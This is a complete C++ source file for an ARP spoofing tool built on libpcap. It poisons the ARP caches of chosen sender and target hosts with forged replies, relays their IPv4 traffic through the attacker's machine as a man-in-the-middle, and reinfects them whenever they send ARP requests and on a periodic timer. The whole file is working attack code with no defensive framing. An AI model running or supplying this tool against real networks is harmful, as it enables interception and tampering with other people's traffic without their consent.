#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <cstring>
#include <vector>

#include "packet.h"

using namespace std;

#define IPV4_LEN 4

struct Flow {
    uint32_t senderIp;
    uint32_t targetIp;
    uint8_t senderMac[6];
    uint8_t targetMac[6];
};

bool getMyInfo(const char* dev, uint8_t* mac, uint32_t& ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket error");
        return false;
    }

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl MAC error");
        return false;
    }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl IP error");
        return false;
    }

    ip = ntohl(*(uint32_t*)&ifr.ifr_addr.sa_data[2]);

    close(fd);
    return true;
}

void ArpRequest(eth_arp_packet& packet,
                uint8_t* myMac,
                uint32_t myIp,
                uint32_t targetIp) {

    memset(packet.eth.dst_mac, 0xff, 6);
    memcpy(packet.eth.src_mac, myMac, 6);
    packet.eth.ethertype = htons(ETHERTYPE_ARP);

    packet.arp.hrd = htons(ARPTYPE_ETHER);
    packet.arp.pro = htons(ETHERTYPE_IPV4);
    packet.arp.hln = ETHERMAC_LEN;
    packet.arp.pln = IPV4_LEN;
    packet.arp.op  = htons(ARP_REQUEST);

    memcpy(packet.arp.smac, myMac, 6);
    packet.arp.sip = htonl(myIp);

    memset(packet.arp.tmac, 0x00, 6);
    packet.arp.tip = htonl(targetIp);
}

void ArpReply(eth_arp_packet& packet,
              uint8_t* myMac,
              uint8_t* senderMac,
              uint32_t senderIp,
              uint32_t targetIp) {

    memcpy(packet.eth.dst_mac, senderMac, 6);
    memcpy(packet.eth.src_mac, myMac, 6);
    packet.eth.ethertype = htons(ETHERTYPE_ARP);

    packet.arp.hrd = htons(ARPTYPE_ETHER);
    packet.arp.pro = htons(ETHERTYPE_IPV4);
    packet.arp.hln = ETHERMAC_LEN;
    packet.arp.pln = IPV4_LEN;
    packet.arp.op  = htons(ARP_REPLY);

    memcpy(packet.arp.smac, myMac, 6);
    packet.arp.sip = htonl(targetIp);

    memcpy(packet.arp.tmac, senderMac, 6);
    packet.arp.tip = htonl(senderIp);
}

void getMac(pcap_t* pcap, uint8_t* myMac, uint32_t myIp, uint32_t targetIp, uint8_t* resultMac) {

    eth_arp_packet packet;
    ArpRequest(packet, myMac, myIp, targetIp);

    pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet));

    struct pcap_pkthdr* header;
    const u_char* recvPacket;

    while(true) {
        int res = pcap_next_ex(pcap, &header, &recvPacket);

        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex error");
            break;
        }

        eth_arp_packet* recv = (eth_arp_packet*)recvPacket;

        if (ntohs(recv->eth.ethertype) == ETHERTYPE_ARP && ntohs(recv->arp.op) == ARP_REPLY) {

    		uint32_t sip = ntohl(recv->arp.sip);

    		if (sip == targetIp) {
        		memcpy(resultMac, recv->arp.smac, 6);
       			printf("MAC FOUND!\n");
        		return;
    		}
	}
    }
}

void infect(pcap_t* pcap, uint8_t* myMac, Flow& f) {

    eth_arp_packet packet;

    printf("Spoof sender\n");
    ArpReply(packet, myMac, f.senderMac, f.senderIp, f.targetIp);
    pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet));

    printf("Spoof target\n");
    ArpReply(packet, myMac, f.targetMac, f.targetIp, f.senderIp);
    pcap_sendpacket(pcap, (const u_char*)&packet, sizeof(packet));
} 

int main(int argc, char* argv[]) 
{ 
	if (argc < 4 || argc % 2 != 0) 
	{ 
		printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip2>...]\n"); 
		return -1; 
	} 
	char* dev = argv[1]; 
	char errbuf[PCAP_ERRBUF_SIZE]; 
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); 
	printf("pcap open success\n"); 
	if (pcap == nullptr) 
	{ 
		printf("pcap error: %s\n", errbuf); 
		return -1; 
	} 
	uint8_t myMac[6]; 
	uint32_t myIp; 
	
	if (!getMyInfo(dev, myMac, myIp)) 
	{ 
		printf("Failed to get my info\n"); 
		return -1; 
	} 
	vector<Flow> flows; 
	for (int i = 2; i < argc; i += 2) 
	{ 
		Flow f; 
		f.senderIp = ntohl(inet_addr(argv[i])); 
		f.targetIp = ntohl(inet_addr(argv[i+1])); 
		getMac(pcap, myMac, myIp, f.senderIp, f.senderMac); 
		getMac(pcap, myMac, myIp, f.targetIp, f.targetMac); 
		flows.push_back(f); 
	} 
	for (auto& f : flows) 
	{ 
		infect(pcap, myMac, f); 
	} 
	printf("Start\n"); 
	int tick = 0; 
	while (true) { 
		struct pcap_pkthdr* header; 
		const u_char* packet; 
		int res = pcap_next_ex(pcap, &header, &packet); 
		if (res != 1) continue; 
		ethernet_header* eth = (ethernet_header*)packet; 
		if (ntohs(eth->ethertype) == ETHERTYPE_IPV4) 
		{ 
			for (auto& f : flows) 
			{ 
				if (memcmp(eth->src_mac, f.senderMac, 6) == 0 && memcmp(eth->dst_mac, myMac, 6) == 0) 
				{ 
					printf("[RELAY] sender → target\n"); 
					u_char buf[header->caplen]; 
					memcpy(buf, packet, header->caplen); 
					ethernet_header* newEth = (ethernet_header*)buf; 
					memcpy(newEth->dst_mac, f.targetMac, 6); 
					memcpy(newEth->src_mac, myMac, 6); 
					pcap_sendpacket(pcap, buf, header->caplen); 
				} 
				else if(memcmp(eth->src_mac, f.targetMac, 6) == 0 && memcmp(eth->dst_mac, myMac, 6) == 0) 
				{ 
					printf("[RELAY] target → sender\n"); 
					u_char buf[header->caplen]; 
					memcpy(buf, packet, header->caplen); 
					ethernet_header* newEth = (ethernet_header*)buf; 
					memcpy(newEth->dst_mac, f.senderMac, 6);
				       	memcpy(newEth->src_mac, myMac, 6); 
					pcap_sendpacket(pcap, buf, header->caplen); 
				} 
			} 
		} 
		if (ntohs(eth->ethertype) == ETHERTYPE_ARP) 
		{ 
			eth_arp_packet* arp = (eth_arp_packet*)packet; 
			for (auto& f : flows) 
			{ 
				if (ntohs(arp->arp.op) == ARP_REQUEST && arp->arp.sip == htonl(f.senderIp)) 
				{ 
					printf("[RECOVER]sender sent ARP request Reinfect!!\n"); 

					eth_arp_packet sendPacket;

					ArpReply(sendPacket, myMac, f.senderMac, f.senderIp, f.targetIp);
					pcap_sendpacket(pcap, (const u_char*)&sendPacket, sizeof(sendPacket));
					 
				} 
				else if (ntohs(arp->arp.op) == ARP_REQUEST && arp->arp.sip == htonl(f.targetIp)) 
				{ 
					printf("[RECOVER]target sent ARP request Reinfect!!\n"); 
					
					eth_arp_packet sendPacket;

					ArpReply(sendPacket, myMac, f.targetMac, f.targetIp, f.senderIp);
					pcap_sendpacket(pcap, (const u_char*)&sendPacket, sizeof(sendPacket));
				}  
				if (ntohs(arp->arp.op) == ARP_REQUEST && arp->arp.sip == htonl(f.targetIp) && arp->arp.tip == htonl(f.senderIp)) { 
					printf("[RECOVER]Router ARP request Reinfect!!\n"); 
					infect(pcap, myMac, f); 
				} 
			} 
                }
		if (++tick % 100 == 0) 
		{ 
                
			printf("[TIMER] periodic reinfection triggered\n"); 
                
			for (auto& f : flows) { 
                        infect(pcap, myMac, f);
			} 
		} 
        
	} 
	pcap_close(pcap); 
}
